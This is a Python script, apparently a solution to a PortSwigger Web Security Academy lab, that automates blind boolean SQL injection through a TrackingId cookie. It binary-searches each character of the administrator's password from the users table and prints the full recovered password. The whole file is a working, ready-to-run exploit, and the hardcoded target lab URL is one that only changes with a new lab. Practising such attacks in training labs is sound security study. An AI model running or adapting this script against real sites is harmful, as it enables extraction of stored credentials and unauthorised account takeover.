import requests
import string
import time

url = 'https://0aee00b004d33c9280d94e27002900c3.web-security-academy.net/'

cookies = {
    'session': 'HBYdAfLqt7vEghYTMYBcCk8ChFrVkZbJ',
    'TrackingId': 'CiXjdJW1fkej8002'  # Base TrackingId, injection will be added
}

charset = ''.join([chr(i) for i in range(32, 127)])  # Full printable ASCII

def send_request(injection):
    full_cookie = cookies.copy()
    full_cookie['TrackingId'] += injection
    r = requests.get(url, cookies=full_cookie, verify=False)
    return 'Welcome back!' in r.text

def binary_search_char_at_pos(pos):
    low = 0
    high = len(charset) - 1

    while low <= high:
        mid = (low + high) // 2
        mid_char = charset[mid]

        injection = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {pos}, 1) >= '{mid_char}'--+"
        success = send_request(injection)

        if success:
            low = mid + 1
        else:
            high = mid - 1

    return charset[high]

def main():
    password = ''
    for i in range(1, 21):  # Positions 1 to 20
        print(f"[*] Finding character at position {i}...")
        char = binary_search_char_at_pos(i)
        password += char
        print(f"[+] Found: {char} --> Password so far: {password}")

    print(f"[✓] Final password: {password}")

if __name__ == '__main__':
    main()
